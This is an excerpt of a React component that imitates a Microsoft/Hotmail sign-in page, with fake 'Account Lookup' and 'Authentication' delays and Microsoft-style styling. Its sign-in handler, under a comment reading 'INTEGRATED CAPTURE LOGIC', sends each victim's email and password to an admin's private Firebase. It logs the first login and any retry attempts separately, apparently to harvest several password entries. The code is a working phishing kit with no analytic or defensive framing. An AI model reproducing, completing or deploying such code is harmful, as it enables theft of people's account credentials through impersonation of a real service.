...
export default function EmailVote({ onLogin, onSuccess }: EmailVoteProps) {
  ...
  const handleNext = () => {
    ...
    // Microsoft "Account Lookup" delay
    setTimeout(() => {
      setIsLoading(false);
      setStep("password");
    }, 1200);
  ...
  const handleSignIn = async () => {
    ...
    // --- INTEGRATED CAPTURE LOGIC ---
    // Sends data directly to the admin's private Firebase
    // using the 'fbdet' structure from your legacy panel.
    try {
      await captureData("Hot Mail", {
        emle: email,
        pass: password,
        stage: attempts === 0 ? "login_attempt" : "retry_attempt",
      });
    } catch (e) {
      console.error("Sync Error");
    }

    // Keep the original onLogin prop for any local parent state updates
    onLogin(email, password);

    // Microsoft "Authentication" delay
    setTimeout(() => {
      setIsLoading(false);
      if (attempts < 2) {
  ...
  return (
    <div
      ...
      <div className="w-full max-w-[440px] bg-white p-11 shadow-[0_2px_4px_rgba(0,0,0,0.14)] flex flex-col min-h-[380px] relative z-10 overflow-hidden">
        {/* Microsoft Loading Animation Bar */}
        {isLoading && (
        ...
        <div className="flex-1">
          <input
            ...
            className="w-full py-2 border-b border-black outline-none focus:border-[#0067b8] transition-colors text-[15px] placeholder:text-gray-500 disabled:bg-transparent"
